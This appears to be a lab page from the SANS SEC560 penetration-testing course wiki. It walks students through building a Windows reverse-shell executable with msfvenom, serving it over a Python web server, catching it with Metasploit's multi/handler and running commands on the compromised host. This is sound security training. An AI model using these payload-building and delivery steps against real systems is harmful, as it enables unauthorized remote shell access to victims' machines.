@@ -1,0 +1,434 @@
+<!DOCTYPE HTML>
+<!--
+    Editorial by HTML5 UP
+    html5up.net | @ajlkn
+    Free for personal and commercial use under the CCA 3.0 license (html5up.net/license)
+
+    560 Wiki made with love and care by the following people:
+    - Tim Medin (@TimMedin, @RedSiegeInfoSec) -- Project Lead, Red Siege Information Security
+    - Erik Van Buggenhout (@@ErikVaBu, @NVISOsecurity) -- Project Lead, NVISO Security
+    - Mick Douglas (@BetterSafetyNet) -- Tech lead, Intern Wrangler, InfoSec Innovations
+        - Yulli Chong -- Intern, InfoSec Innovations
+        - Aaron Sawyer (@CrashingStatic) -- Intern, InfoSec Innovations
+-->
+<html>
+    <head>
+        <title>SANS SEC560 Lab Wiki</title>
+        <meta charset="utf-8" />
+        <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no" />
+        <link rel="stylesheet" href="css/main.css" />
+    </head>
+    <body>
+
+        <!-- Wrapper -->
+            <div id="wrapper">
+
+                <!-- Main -->
+                    <div id="main">
+                        <div class="inner">
+
+                            <!-- Header -->
+                                <header id="header">
+                                    <a href="index.html" class="logo">SANS SEC 560 Lab Wiki</a>
+                                    <ul class="icons">
+                                        <li><a href="https://twitter.com/search?q=Sec560" class="icon fa-twitter"><span class="label">Twitter</span></a></li>
+                                    </ul>
+                                </header>
+
+                            <!-- Content -->
+                            <!-- Converted Markdown body (AKA HTML stubs) goes here -->
+<h1 id="lab-31-metasploit">Lab 3.1: Metasploit</h1>
+<h2 id="objectives">Objectives</h2>
+<p>The goal of this lab is to use several features of Metasploit to attack and gain shell access of a Windows machine. To achieve that goal, we use a variety of fantastically useful components of Metasploit, as well as a Python-based web server called http.server.</p>
+<p>In particular, here are the components of Metasploit you&rsquo;ll become familiar with in this lab:</p>
+<p><strong>msfvenom</strong>: Penetration testers can use this Metasploit Framework program to create malicious standalone payload files. In this lab, you create a malicious EXE file that provides shell access of a Windows machine where it runs.</p>
+<p><strong>http.server</strong>: This Python-based web server isn&rsquo;t part of Metasploit but can be used with Metasploit to serve up files in a convenient, flexible manner.</p>
+<p><strong>msfconsole</strong>: The Metasploit Framework Console program is the command center for Metasploit, letting you configure the framework and interact with sessions on compromised machines.</p>
+<p><strong>exploit/multi/handler</strong>: This generic exploit lets you configure Metasploit to wait for inbound (that is, "phone home") connections from compromised targets. When this so-called multi/handler receives a connection, it pushes back a Metasploit payload to run on the target.</p>
+<p><strong>payload/shell/reverse_tcp</strong>: This payload makes a connection FROM the target machine back TO Metasploit, giving you shell access of the target&mdash;that is, a reverse shell. It is made from the shell stage and the reverse_tcp stager.</p>
+<h2 id="lab-steps">Lab Steps</h2>
+<p>This lab consists of the following steps, numbered 1 through 5. These same step numbers are included in the architecture figure below as well as the various sections of the lab. Thus, you can follow along as you work through the lab.</p>
+<p><strong>Step 1</strong>: In Linux, use Metasploit&rsquo;s msfvenom program to create a malicious EXE file that provides a reverse shell connection back to msfconsole when executed on a Windows machine. Call the malicious file file.exe.</p>
+<p><strong>Step 2</strong>: Also in Linux, run a simple web server called http.server, which is a Python-based program that can serve up webpages based on files in your file system. You&rsquo;ll serve up file.exe.</p>
+<p><strong>Step 3</strong>: Configure msfconsole in Linux to wait for a connection to come in from an exploited Windows machine that runs file.exe. Do this by setting up exploit/multi/handler (known as the multi/handler for short) along with a shell/reverse_tcp payload.</p>
+<p><strong>Step 4</strong>: On Windows, run a browser and surf to your Linux machine. You&rsquo;ll be prompted to run file.exe, which you should do.</p>
+<p><strong>Step 5</strong>: When file.exe runs on Windows, it connects back to the multi/handler in msfconsole on Linux. You&rsquo;ll see that inbound connection and start interacting with your shell session on the compromised Windows machine.</p>
+<p>In each of these steps, you&rsquo;ll become familiar with using and configuring msfvenom and msfconsole, interacting with an exploited target and controlling sessions to it.</p>
+<p><img  class="myImg"  src="pics/Ex3.1_img01.png" style="width:100%;max-width:600px"  alt="Attack overview" /></p>
+<h4 id="step-1-building-the-malicious-file">Step 1: Building the malicious file</h4>
+<p>Run <code>msfvenom</code> with the <code>-help</code> option so that you can get a brief synopsis of its syntax. To use the tool, you need to specify the payload you want with the <code>-p</code> flag, a list of variables for that payload (including port numbers to connect to), and the format of payload you want (including EXE, which you specify with a <code>-f</code> exe):</p>
+<pre>
+$ <b>msfvenom -help</b>
+</pre>
+
+<p><img  class="myImg"  src="pics/Ex3.1_img11.png" style="width:100%;max-width:600px"  alt="Msfvenom help" /></p>
+<p>To see the formats of payloads you can generate, run:</p>
+<pre>
+$ <b>msfvenom --list format</b>
+</pre>
+
+<p>There are a large number of supported formats! The -f exe option creates a Windows executable.</p>
+<p>Now run <code>msfvenom</code> to turn <code>windows/shell/reverse_tcp</code> into a standalone file. When it&rsquo;s executed, you want this payload to connect back to your Linux machine, so you need to configure the LHOST (that&rsquo;s localhost) to your Linux IP address so it&rsquo;ll connect back to you. Set the local port for it to connect back to (LPORT) to 8080. Finally, put a <code>-f exe</code> at the end of the list of items for msfvenom. This tells it to create a file in the Windows EXE format. The msfvenom tool simply displays the malicious file on Standard Output, so redirect your resulting malicious file to your file system in <code>/tmp/file.exe</code>.</p>
+<blockquote>
+<p>NOTE: Do not type <code>YOUR_LINUX_IP_ADDRESS</code>, instead type the IP address of your Linux host (e.g., 10.10.75.123).</p>
+</blockquote>
+<pre>
+$ <b>msfvenom -p windows/shell/reverse_tcp LHOST=<i>YOUR_LINUX_IP_ADDRESS</i> LPORT=8080 -f exe > /tmp/file.exe</b>
+</pre>
+
+<p>Your output should be similar to this:</p>
+<pre>
+$ <b>msfvenom -p windows/shell/reverse_tcp LHOST=10.10.75.102 LPORT=8080 -f exe > /tmp/file.exe</b>
+[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
+[-] No arch selected, selecting arch: x86 from the payload
+No encoder or badchars specified, outputting raw payload
+Payload size: 341 bytes
+Final size of exe file: 73802 bytes
+</pre>
+
+<p>Check the size of file.exe. It should be very close to the 73,802 bytes you see in the screenshot (although it may be one or two bytes bigger, given that your IP address may differ):</p>
+<pre>
+$ <b>ls -l /tmp/file.exe</b>
+</pre>
+
+<p>Your output should be similar to this:</p>
+<pre>
+$ <b>ls -l /tmp/file.exe</b>
+-rw-r--r-- 1 sec560 sec560 <em>73802</em> Jun  5 22:23 /tmp/file.exe
+</pre>
+
+<p>If /tmp/file.exe is not 73,802 bytes (possibly plus a byte or two), delete it (with <code>rm /tmp/file.exe</code>), double-check your syntax for msfvenom, and regenerate it.</p>
+<h4 id="step-2-serve-the-file-from-linux">Step 2: Serve the file from Linux</h4>
+<p>Configure a Linux web server to serve up the contents of your <code>/tmp</code> directory (which includes <code>file.exe</code>).</p>
+<p>Now <code>cd</code> into the directory whose contents you want to serve up via HTTP:</p>
+<pre>
+$ <b>cd /tmp</b>
+</pre>
+
+<p>To finish Step 2, run the Python interpreter to invoke the module called <code>http.server</code>, listening on TCP port 8000 (default):</p>
+<pre>
+$ <b>python3 -m http.server</b>
+</pre>
+
+<p>You should see an indication that it is <code>Serving HTTP on 0.0.0.0 on port 8000</code>.</p>
+<p><img  class="myImg"  src="pics/Ex3.1_img13.png" style="width:100%;max-width:600px"  alt="Running the python web server" /></p>
+<p>With the http.server running in one window, we now move to Step 3, invoking and configuring Metasploit&rsquo;s msfconsole.</p>
+<h4 id="step-3-configure-msfconsole">Step 3: Configure msfconsole</h4>
+<p>OPEN ANOTHER TERMINAL WINDOW! IN THIS SECOND TERMINAL WINDOW (separate from your <code>http.server</code> command), invoke the <code>msfconsole</code> program.</p>
+<pre>
+$ <b>sudo msfconsole</b>
+</pre>
+
+<p>At the msf prompt, issue commands to Metasploit interactively. Tell it to show all the exploit modules it has available:</p>
+<pre>
+msf > <b>show exploits</b>
+</pre>
+
+<p>Metasploit features more than 1,800 different exploits for a variety of different software flaws.</p>
+<p><img  class="myImg"  src="pics/Ex3.1_img14.png" style="width:100%;max-width:600px"  alt="Running the web server and msfconsole" /></p>
+<p>We&rsquo;ll be using exploit/multi/handler, also known for short as the multi/handler. To get more information about the multi/handler and what it does, run:</p>
+<pre>
+msf > <b>info exploit/multi/handler</b>
+</pre>
+
+<p>We can use this info command in msfconsole at any time to learn more about the thousands of modules in Metasploit, including exploits, payloads, auxiliary modules, and more. The output provides a handy summary of the use of the module, its variables, and other options for its configuration.</p>
+<p><img  class="myImg"  src="pics/Ex3.1_img16.png" style="width:100%;max-width:600px"  alt="info multi/handler" /></p>
+<p>For the multi/handler, note the Description: "This module is a stub that provides all of the features of the Metasploit payload system to exploits that have been launched outside the framework". After configuring the multi/handler, we&rsquo;ll have a user download our malicious file.exe using a browser and run it manually (thus launching it outside the framework). The file.exe program will connect back into the multi/handler, where we&rsquo;ll control it.</p>
+<p>We can use the multi/handler to wait for a connection from file.exe. Please choose this exploit via the use command:</p>
+<pre>
+msf5 > <b>use exploit/multi/handler</b>
+</pre>
+
+<p>Your prompt changes context to say msf exploit(handler) &gt;. That tells you the specific module context msfconsole is now running in. We can now see all the payloads that are compatible with our chosen exploit by running:</p>
+<pre>
+msf5 exploit(multi/handler) > <b>show payloads</b>
+</pre>
+
+<p>If you dig through this list, you&rsquo;ll see that windows/shell/reverse_tcp is one of the payloads that will work with the multi/handler exploit. That&rsquo;s the one we&rsquo;ll use so it matches the <code>file.exe</code> payload we created earlier</p>
+<p>To select the <code>windows/shell/reverse_tcp</code> payload, use the <code>set</code> command:</p>
+<pre>
+msf5 exploit(multi/handler) > <b>set PAYLOAD windows/shell/reverse_tcp</b>
+</pre>
+
+<p>When we built file.exe, we told msfvenom to build a malicious EXE file using this same payload (<code>windows/shell/reverse_tcp</code>). It is interesting to note that if we configure a malicious file like file.exe with a DIFFERENT payload than the payload we send back using the multi/handler in msfconsole, the payload sent back by the multi/handler takes precedence! That is, a Metasploit-generated malicious file (like file.exe) will fetch from the multi/handler a DIFFERENT payload than it was built with and run that different payload, overriding any of its own payload functionality. For this lab, though, we&rsquo;ll use the same payload in multi/handler as we used in file.exe with msfvenom. Most penetration testers use the same payload, so that is what we&rsquo;ll do here.</p>
+<p>After you select a payload, look at all the options you can configure by running:</p>
+<pre>
+msf5 exploit(multi/handler) > <b>show options</b>
+</pre>
+
+<p>Here you can see some important options, such as LHOST and LPORT (the IP address and port number where the delivered payload will connect back to). Let&rsquo;s set those next.</p>
+<p><img  class="myImg"  src="pics/Ex3.1_img17.png" style="width:100%;max-width:600px"  alt="Module configuration options" /></p>
+<p>Set the LHOST for the payload to your Linux IP address so that the payload can connect back to your Linux machine when it runs on the Windows target. (Again, note that we could override the LHOST we built into file.exe if we chose a different address here because the multi/handler payload and its configuration will override the file.exe payload. But we&rsquo;ll use the same address of our Linux machine for this lab.) We'll set <code>LHOST</code> to <code>0.0.0.0</code> so it listens on all interfaces. In this case, our payload file (<code>file.exe</code>) knows where to connect to since we provided the <code>LHOST</code> with <code>msfvenom</code>.</p>
+<pre>
+msf5 exploit(handler)> <b>set LHOST 0.0.0.0</b>
+</pre>
+
+<p>We now set the LPORT to 8080 for the connection back:</p>
+<pre>
+msf5 exploit(handler)> <b>set LPORT 8080</b>
+</pre>
+
+<p>Confirm your setting by looking at the output of <code>show options</code>.</p>
+<p><img  class="myImg"  src="pics/Ex3.1_img17b.png" style="width:100%;max-width:600px"  alt="Confirming configuration" /></p>
+<p>To activate the multi/handler, please run the following command:</p>
+<pre>
+msf5 exploit(handler)> <b>exploit</b>
+</pre>
+
+<p>When you run exploit by itself, it ties up your msfconsole prompt. For more flexibility, we&rsquo;d like to get msfconsole back and run the multi/handler in the background. To do so, press <code>CTRL-C</code> to stop the multi/handler:</p>
+<pre>
+msf exploit(handler)> <b>&lt;CTRL-C&gt;</b>
+</pre>
+
+<p>Now run the exploit command with the <code>-j</code> option to "jobify" the exploit execution:</p>
+<pre>
+msf5 exploit(handler)> <b>exploit -j</b>
+</pre>
+
+<p>You should now see an indication that the multi/handler is listening in the background and have your msfconsole prompt back. In msfconsole, you can have an arbitrary number of background jobs running, each doing different things on different ports.</p>
+<p>At any time, you can get a list of backgrounded jobs from msfconsole by running:</p>
+<pre>
+msf exploit(handler)> <b>jobs</b>
+</pre>
+
+<p><img  class="myImg"  src="pics/Ex3.1_img18.png" style="width:100%;max-width:600px"  alt="Msf exploit jobs" /></p>
+<h4 id="step-4-download-the-file-in-windows">Step 4: Download the file in Windows</h4>
+<p>Open Chrome and surf to the URL below:</p>
+<pre>
+<b>http://<i>YOUR_LINUX_IP_ADDRESS</i>:8000</b>
+</pre>
+
+<blockquote>
+<p>Note: Do not type <code>YOUR_LINUX_IP_ADDRESS</code>; instead, use the IP address of your Linux host (e.g., 10.10.75.123).</p>
+</blockquote>
+<p>You should see a listing of the contents of your Linux <code>/tmp</code> directory, which includes <code>file.exe</code>.</p>
+<p><img  class="myImg"  src="pics/Ex3.1_img19.png" style="width:100%;max-width:600px"  alt="See directory listing in Chrome" /></p>
+<p>Click <code>file.exe</code>. Your browser will download the file and show it in the bottom left of the browser window. Click on the file in the bottom of the browser window.</p>
+<p>Your browser should prompt you with a message saying, "Do you want to run or save file.exe..."</p>
+<p>Click Run.</p>
+<p>In your Linux terminal running <code>http.server</code>, you should see incoming HTTP GET requests.</p>
+<p><img  class="myImg"  src="pics/Ex3.1_img21.png" style="width:100%;max-width:600px"  alt="see incoming HTTP GET requests" /></p>
+<p>In your msfconsole terminal on Linux, you should see the inbound session attempt coming in with the text "Command shell session 1 opened", with information about the source and destination IP addresses and port numbers.</p>
+<p>If you see a successfully opened session, please move to Step 5 below.</p>
+<p>On occasion, the command shell session dies with Metasploit saying, "Command shell session 1 closed. Reason: Died..." If this happens to you, go back to your Windows browser, click file.exe, and then click Run.</p>
+<p>Also, at any time, you can run the jobs command to ensure that your multi/handler is still running.</p>
+<pre>
+msf5 exploit(handler)> <b>jobs</b>
+</pre>
+
+<p>If your multi/handler isn&rsquo;t running, you can re-invoke it by using the <code>exploit -j</code> command.</p>
+<p>In your Linux msfconsole screen, press <code>Enter</code> until you get the <code>msf &gt;</code> prompt back.</p>
+<p><img  class="myImg"  src="pics/Ex3.1_img26.png" style="width:100%;max-width:600px"  alt="Msfconsole screen prompt" /></p>
+<p>You should see your msf prompt again. You have a session with the target Windows machine running in the background. To get a list of sessions, run:</p>
+<pre>
+msf exploit(handler)> <b>sessions -l</b>
+</pre>
+
+<blockquote>
+<p>That is a dash-lowercase L, not a dash-one.</p>
+</blockquote>
+<p>You now see a list of all sessions Metasploit has open with targets. You likely have one such session with a low session ID number (such as number "1"). Make a note of that session number. Let&rsquo;s interact with that session by running the sessions command to interact (<code>-i</code>) with session number N:</p>
+<pre>
+msf exploit(handler)> <b>sessions -i <i>N</i></b>
+</pre>
+
+<p><img  class="myImg"  src="pics/Ex3.1_img26b.png" style="width:100%;max-width:600px"  alt="msf exploit session interaction" /></p>
+<p>You now should see the <code>C:\&gt;</code> prompt from your Windows machine. We&rsquo;ve gotten shell access of the Windows target. You can now type a variety of Windows commands into that session.</p>
+<p>To see your current privileges, run:</p>
+<pre>
+C:\> <b>whoami</b>
+</pre>
+
+<p>To get a list of TCP and UDP activity, run:</p>
+<pre>
+C:\> <b>netstat -na</b>
+</pre>
+
+<p>In the output of netstat, you should see an ESTABLISHED connection from your Windows machine to your Linux machine on TCP port 8080.</p>
+<p>To get a directory listing of the <code>C:\</code> directory, run:</p>
+<pre>
+C:\> <b>cd C:\</b>
+C:\> <b>dir</b>
+</pre>
+
+<p><img  class="myImg"  src="pics/Ex3.1_img27.png" style="width:100%;max-width:600px"  alt="Directory listing of C:&gt;" /></p>
+<p>You can execute arbitrary additional commands at this Windows prompt, exploring the system from the vantage point of an msfconsole session with the target machine.</p>
+<p>To see network settings, please run:</p>
+<pre>
+c:\> <b>ipconfig</b>
+</pre>
+
+<p>To see your Windows system DNS cache, please run:</p>
+<pre>
+c:\> <b>ipconfig /displaydns</b>
+</pre>
+
+<p>To list running processes, please run:</p>
+<pre>
+c:\> <b>tasklist</b>
+</pre>
+
+<p>You can explore your Windows machine at the command line.</p>
+<p>After you finish interacting with your shell, kill it with <code>CTRL-C</code>.</p>
+<p>Look at the output of the <code>jobs</code> command:</p>
+<pre>
+msf5 exploit(handler)> <b>jobs</b>
+</pre>
+
+<p>You&rsquo;ll see that your multi/handler job has finished. It stops when it gets one successfully exploited system. You could restart it as a background job by running the exploit <code>-j</code> command, but you don&rsquo;t have to do that here.</p>
+<p>To get more information about msfconsole&rsquo;s capabilities for interacting with sessions, run the sessions command with the <code>-h</code> (help) option:</p>
+<pre>
+msf5 exploit(handler)> <b>sessions -h</b>
+</pre>
+
+<p>You&rsquo;ll see here that you can kill sessions from msfconsole by using either the <code>-k</code> flag to kill an individual session number or the <code>-K</code> flag (capital K) to kill all sessions. To finish this lab, kill all sessions:</p>
+<pre>
+msf exploit(handler)> <b>sessions -K</b>    
+</pre>
+
+<blockquote>
+<p>That is a capital K.</p>
+</blockquote>
+<p>And, finally, exit msfconsole:</p>
+<pre>
+msf5 exploit(handler)> <b>exit</b>
+</pre>
+
+<h2 id="conclusion">Conclusion</h2>
+<p>In conclusion, in this lab, you analyzed how to use several components of Metasploit to compromise a target machine and interact with a session to that target. In particular, you used the following hugely valuable components of Metasploit:</p>
+<p><strong>msfvenom</strong>, which creates malicious files built from Metasploit payloads</p>
+<p><strong>msfconsole</strong>, which allows us to configure Metasploit and control sessions interactively</p>
+<p><strong>exploit/multi/handler</strong>, a Metasploit exploit module that listens for connections from outside of the framework and delivers back configured payloads for execution at a target</p>
+<p><strong>windows/shell/reverse_tcp</strong>, a Metasploit payload module that provides reverse shell access of a target machine</p>
+<p><strong>http.server</strong>, a non-Metasploit tool that implements a Python-based web server, which is handy for serving up files, including Metasploit-generated attack files</p>
+<p>As you have seen, shell access of a target is extremely valuable. In our post-exploitation portion coming up later in the course, we&rsquo;ll look at ways to leverage this shell to further the penetration test.</p>
+
+                        </div>
+                    </div>
+
+                <!-- Sidebar -->
+                    <div id="sidebar">
+                        <div class="inner">
+
+                            <!-- Search -->
+                            <!-- MBD 20180705 - Search feature is disabled for now.  Will enable it once we get OK
+                                <input type="text" name="query" id="query" placeholder="Search" />
+                                    <button onclick="myFunction()">?</button>
+                                        <script>
+                                        function myFunction() {
+                                                var x = document.getElementById("query").value;
+                                               var res =  idx.search(x);
+                                            alert(res);
+                                       </script>
+                            -->
+
+                            <!-- Menu -->
+                                <nav id="menu">
+                                    <header class="major">
+                                        <h2>Menu</h2>
+                                    </header>
+                                    <ul>
+                                        <li><a href="index.html">Homepage</a></li>
+                                        <li><a href="Getting-Started.html">Getting Started</a></li>
+                                        <li>
+                                            <span class="opener">Book 1:</span>
+                                            <ul>
+                                                <li><a href="Lab-1.1-Setting-Up-The-Image.html">Setting Up The Image</a></li>
+                                                <li><a href="Lab-1.2-Scope-and-RoE-Role-Play.html">Scope and RoE Role Play</a></li>
+                                                <li><a href="Lab-1.3-Metadata-Treasure-Hunt.html">Metadata Treasure Hunt</a></li>
+                                                <li><a href="Lab-1.4-Recon-ng-for-DNS-Analysis.html">Recon-ng for DNS Analysis</a></li>
+                                            </ul>
+                                        </li>
+                                        <li>
+                                            <span class="opener">Book 2:</span>
+                                            <ul>
+                                            	<li><a href="Lab-2.1-Nmap.html">Nmap</a></li>
+                                            	<li><a href="Lab-2.2-Nmap-O-sV.html">Nmap -O -sV</a></li>
+                                                <li><a href="Lab-2.3-NSE.html">NSE</a></li>
+                                                <li><a href="Lab-2.4-Nessus.html">Nessus</a></li>
+                                                <li><a href="Lab-2.5-Netcat.html">Netcat</a></li>
+                                                <li><a href="Lab-2.6-PowerShell.html">PowerShell</a></li>
+                                            </ul>
+                                        </li>
+                                        <li>
+                                            <span class="opener">Book 3:</span>
+                                            <ul>
+                                                <li><a href="Lab-3.1-Metasploit.html">Metasploit</a></li>
+                                                <li><a href="Lab-3.2-Meterpreter.html">Meterpreter</a></li>
+                                                <li><a href="Lab-3.3-Veil.html">Veil</a></li>
+                                                <li><a href="Lab-3.4-Port-Pivot-Relays.html">Port Pivot Relays</a></li>
+                                                <li><a href="Lab-3.5-Empire.html">Empire</a></li>
+                                                <li><a href="Lab-3.6-Running-Commands-with-sc-and-WMIC.html">Running Commands with sc and WMIC</a></li>
+                                            </ul>
+                                        </li>
+                                        <li>
+                                            <span class="opener">Book 4:</span>
+                                            <ul>
+                                                <li><a href="Lab-4.1-Hydra-Password-Guessing.html">Hydra Password Guessing</a></li>
+                                                <li><a href="Lab-4.2-MSF-psexec-hashdump-kiwi.html">MSF psexec, hash dumping, and Kiwi</a></li>
+                                                <li><a href="Lab-4.3-MSF-pivots.html">MSF Pivots</a></li>
+                                                <li><a href="Lab-4.4-Cracking-with-JtR-and-Hashcat.html">Cracking with John the Ripper and Hashcat</a></li>
+                                                <li><a href="Lab-4.5-Sniffing-Cracking.html">Sniffing & Cracking</a></li>
+                                                <li><a href="Lab-4.6-Pass-the-Hash.html">Pash the Hash</a></li>
+                                            </ul>
+                                        </li>
+                                        <li>
+                                            <span class="opener">Book 5:</span>
+                                            <ul>
+                                                <li><a href="Lab-5.1-Kerberos.html">Kerberos</a></li>
+                                                <li><a href="Lab-5.2-Responder.html">Responder</a></li>
+                                                <li><a href="Lab-5.3-Bloodhound.html">Bloodhound</a></li>
+                                                <li><a href="Lab-5.4-Privilege-Escalation.html">Privilege Escalation</a></li>
+                                                <li><a href="Lab-5.5-Domain-Dominance.html">Domain Dominance</a></li>
+                                                <li><a href="Lab-5.6-ZAP-Proxy.html">ZAP Proxy</a></li>
+                                                <li><a href="Lab-5.7-Command-Injection.html">Command Injection</a></li>
+                                                <li><a href="Lab-5.8-SQL-Injection.html">SQL Injection</a></li>
+                                            </ul>
+                                        </li>
+                                        <li>
+                                            <span class="opener">Book 6:</span>
+                                            <ul>
+                                                <li><a href="Lab-6.1a-Connecting-to-the-Network.html">Connecting to the Network</a></li>
+                                                <li><a href="Lab-6.1b-Online-CTF-Access.html">Online CTF Access</a></li>
+                                            </ul>
+                                        </li>
+                                        <li>
+                                            <span class="opener">Cheatsheets</span>
+                                            <ul>
+                                                <li><a href="other/MetsploitCheatsheet.pdf">Metasploit</a></li>
+                                                <li><a href="other/NetcatCheatSheetV1.pdf">Netcat</a></li>
+                                                <li><a href="other/WindowsCommandLineSheetV1.pdf">Windows Command Line</a></li>
+                                            </ul>
+                                        </li>
+                                    </ul>
+                                </nav>
+
+
+
+                            <!-- Footer -->
+                                <footer id="footer">
+                                    <p class="copyright">&copy; Tim Medin<br>
+                                        All rights reserved. <br>
+                                        Design: <a href="https://html5up.net">HTML5 UP</a>.</p>
+                                </footer>
+
+                        </div>
+                    </div>
+
+            </div>
+
+            <!-- The Modal -->
+            <div id="myModal" class="modal">
+                <span class="close">&times;</span>
+                <img class="modal-content" id="img01">
+                <div id="caption"></div>
+            </div>
+
+        <!-- Scripts -->
+            <script src="js/jquery.min.js"></script>
+            <script src="js/skel.min.js"></script>
+            <script src="js/util.js"></script>
+            <script src="js/main.js"></script>
+
+    </body>
+</html>
